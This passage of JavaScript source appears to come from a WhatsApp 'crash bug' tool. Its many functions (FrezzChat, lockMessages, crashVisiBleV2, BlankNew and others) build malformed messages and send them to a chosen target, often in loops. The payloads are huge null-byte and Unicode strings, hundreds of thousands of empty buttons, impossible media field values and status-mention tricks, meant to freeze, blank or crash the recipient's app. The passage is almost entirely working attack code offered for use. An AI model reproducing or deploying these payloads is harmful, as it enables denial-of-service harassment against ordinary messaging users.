    await sock.relayMessage(target, payload4, { participant: { jid: target } }).catch(e => console.log("err4"))
    
    for (let p = 0; p < 15; p++) {
      await sock.sendPresenceUpdate('composing', target).catch(e => {})
      await sock.sendPresenceUpdate('recording', target).catch(e => {})
    }
    
    console.log( Loop ${i+1}/50 - target makin blank)
  }
  
  for (let final = 0; final < 10; final++) {
    await sock.sendMessage(target, {
      text: '\u0000'.repeat(999999) + 'ꦽꦾ'.repeat(99999) + '\u200b'.repeat(99999)
    }).catch(e => {})
    
    await sock.relayMessage(target, {
      buttonsMessage: {
        contentText: "💀".repeat(500000),
        footerText: "\u0000".repeat(50000),
        buttons: [
          {
            buttonId: "Garam madu",
            buttonText: { displayText: "ꦽ".repeat(100000) },
            type: 1
          }
        ],
        headerType: 1
      }
    }, { participant: { jid: target } }).catch(e => {})
  }
  
  console.log(Blank Hard Succes sent to ${target})
  console.log(" Target blank total ")
}

async function FrezzChat(sock, target) {
    try {
        const payloads = [
            {
                groupStatusMessageV2: {
                    message: {
                        interactiveMessage: {
                            body: { text: "SedhowIsHare" },
                            nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) },
                            contextInfo: { quotedMessage: { stickerPackMessage: {} } }
                        }
                    }
                }
            },
            {
                groupStatusMessageV2: {
                    groupJid: "120363000000000000@g.us",
                    status: "@Meta_AI",
                    message: {
                        interactiveResponseMessage: {
                            body: { text: "invis" },
                            nativeFlowResponseMessage: {
                                name: "menu_options",
                                paramsJson: JSON.stringify({
                                    display_text: "\u0000".repeat(999999),
                                    description: "\u0000".repeat(99999),
                                    id: "CELAN"
                                }),
                                version: 3
                            }
                        }
                    }
                }
            },
            {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            header: { title: "\u0000.CELAN" + "{{".repeat(500000) },
                            body: { text: "sedhow SHD", footer: "Sedhow" },
                            nativeFlowResponseMessage: {
                                name: "order_status",
                                paramsJson: "\x10".repeat(500000) + "\u0000".repeat(800000),
                                version: 3
                            },
                            entryPointConversionSource: "payment_info"
                        }
                    }
                }
            },
            {
                interactiveMessage: {
                    body: { text: "sedhow" },
                    footer: { text: "Sedhow Is Hare " },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "galaxy_message",
                            buttonParamsJson: JSON.stringify({
                                wa_flow_response_params: {
                                    title: "${Msg}",
                                    overflow: "${Bkp}"
                                },
                                crash: { null: null, recursive: {} }
                            })
                        }],
                        messageParamsJson: JSON.stringify({ version: 0 })
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 999
                    }
                }
            },
            {
                interactiveMessage: {
                    body: { text: "LOADING..." },
                    nativeFlowMessage: { buttons: Array.from({ length: 99999 }, () => ({})) }
                }
            }
        ];

        for (let i = 0; i < 100; i++) {
            for (const payload of payloads) {
                await sock.relayMessage(target, payload, {
                    participant: { jid: target },
                    noSelfSync: true
                });
            }
        }

        return "✅ Frezz Done : " + target;
    } catch (e) {
        return "❌ " + e.message;
    }
}

async function CrashKlikMaklo(sock, target) {
await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "𝐁𝐢𝐳𝐳𝐈𝐳𝐢𝐧𝐓𝐚𝐦𝐩𝐢𝐥!!"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "booking_status",
                 ParamsJson: "\u0003".repeat(90000),
               },
             ],
           },
         },
       }, { participant: { jid: target }});
     }

async function delayinvinvis(sock, target) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0000",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(999999),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
    }
}

async function lockMessages(sock, target) {
    const zephyrineMessages = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",

                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 9007199254740991,
                                mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                fileName: "\u0001",
                                fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1723855952",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: Buffer.alloc(0)
                            },

                            hasMediaAttachment: true
                        },

                        body: {
                            text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩"
                        },

                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),

                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
                                        sections: [{ title: "\r", rows: [] }]
                                    })
                                },
                                {
                                    name: "payment_method",
                                    buttonParamsJson: "\u0010".repeat(2500)
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}"
                                },
                                {
                                    name: "payment_method",
                                    buttonParamsJson: "{}"
                                },
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
                                        sections: [{
                                            title: "\"\r".repeat(99999),
                                            rows: []
                                        }]
                                    })
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        flow_action: "navigate",
                                        flow_action_payload: {
                                            screen: "WELCOME_SCREEN"
                                        },
                                        flow_cta: "\"\r".repeat(99999),
                                        flow_id: "1169834181134583",
                                        flow_message_version: "3",
                                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                                    })
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{}"
                                }
                            ]
                        }
                    }
                }
            }
        },
        {
            userJid: target,
            quoted: null
        }
    );

    await sock.relayMessage(
        target,
        zephyrineMessages.message,
        {
            messageId: zephyrineMessages.key.id,
            participant: { jid: target },
            userJid: target
        }
    );
}

async function VnXNewDelayHard(sock, target) {
  const vnxmbgdly = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from(
                {
                  length: 2000,
                },
                () =>
                  '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
              ),
            ],
            body: {
              text: 'VnX',
              format: 'DEFAULT',
            },
            footer: {
              text: '\u0000'.repeat(25000),
              format: 'DEFAULT',
            },
            nativeFlowResponseMessage: {
              name: 'galaxy_message',
              paramsJson: `{\"flow_cta\":{\"title\":${"\u0000".repeat(990000)}}}`,
              version: 3,
             },
           },
         },
       },
     },
   };

  await sock.relayMessage(target, vnxmbgdly, {
    participant: { jid: target },
  });
}

async function XFCUI(sock, target) {
sock.relayMessage(
target,
{
locationMessage: {
degreesLatitude: 1010101,
degreesLongitude: 1010101,
name: "⤻꙳‌‌༑𝐋𝐚𝐮 𝐊𝐞𝐧𝐚𝐥 𝐁𝐢𝐳𝐳𝐳𝐳?¿" + "ꦽ⸙".repeat(60000),
address: ".sevrin444 ( @jaaxnv )",
url: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/" + "ꦽ⸙".repeat(60000),
clickToWhatsappCall: true,
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: target
},
mentionedJid: [target,"13135550002@s.whatsapp.net"]
}
}
},
{ participant: {jid: target} }
)
}

async function ngelayyy(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\0",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(500);

  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\0",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

await sleep(500);

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
}

async function ilmuhytamNoClick(sock, target) {
  try {
    console.log(`[Function ilmu hytam] Processing: ${target}`);

    const generateId = () => Math.random().toString(36).substring(2, 15);

    const msg = {
      key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mimetype: "image/jpeg",
          fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
          caption: "ilmu hytam Is Here",
          fileLength: "149502",
          height: 1397,
          width: 1126,
          mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
          fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
          jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true
          },
          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
          scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
          midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [{
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }]
        }
      }
    }, {});

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {});

    console.log(`[Function ilmu hytam] Success: ${target}`);

  } catch (error) {
    console.error(`[Function ilmu hytam] Error: ${error.message}`);
  }
}

async function crashVisiBleV2(sock, target) {
const album = await generateWAMessageFromContent(target, {
  albumMessage: {
    expectedImageCount: 9999,
    expectedVideoCount: 9999
  }
}, {
  participant: { jid: target }
})

await sock.relayMessage(target, album.message, {
  messageId: album.key.id
})

await sleep(2000); 
 
 const MakLo = { 
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "MakLoo¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
};

const msg = generateWAMessageFromContent(target, MakLo, {});

await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function crasInVisiBleV4(sock, target) {
await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "MakLo(RcB)"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "booking_status",
                 ParamsJson: "\u0003".repeat(90000),
         },
       ],
     },
   },
 }, { participant: { jid: target }});
   
await sleep(2000);

 const MakLo = { 
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "MakLoo¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
};

const msg = generateWAMessageFromContent(target, MakLo, {});

await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function CrashHidDel(sock, target) {
const MakLo = {
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 999999999,
                height: 9999,
                width: 9999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: null,
               caption: "MakLo¡!" + "҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝".repeat(10),
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [
                    9999999999999999999,
                    9999999999999999999,
                    9999999999999999999,
                    9999999999999999999
                ],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
    };

        const msg = generateWAMessageFromContent(target, MakLo, {});
        
        await sock.relayMessage(target, msg.message, {
            messageId: msg.key.id
        });

await sleep(4000);

        await sock.sendMessage(target, {
    delete: msg.key,
  });
}

async function AmbaCrashAmat(sock, target) {
  await sock.relayMessage(target, {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "𝑳𝒂𝒖𝑲𝒆𝒏𝒂𝒍𝑩𝒊𝒛𝒛?¿™",
      firstScanLength: 999999999,
      firstScanSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      experimentGroupId: 999999999,
      interactiveAnnotations: [],
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      annotations: [],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0=",
      midQualityFileEncSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    }
  }, { participant: { jid: target } });
}

async function crasInVisiBle(sock, target) {
  const MakLo = { 
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "MakLoo¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
};

const msg = generateWAMessageFromContent(target, MakLo, {});

await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function BlankNew(sock, target) {
  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "./Rio4you" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "./Rio4you" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "Riooffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "Riooffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "Riooffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "Riooffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "Riooffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "Riooffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "Riooffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "Riooffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "Riooffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "Riooffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
            }
        },
        packDescription: "./Rio4you" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
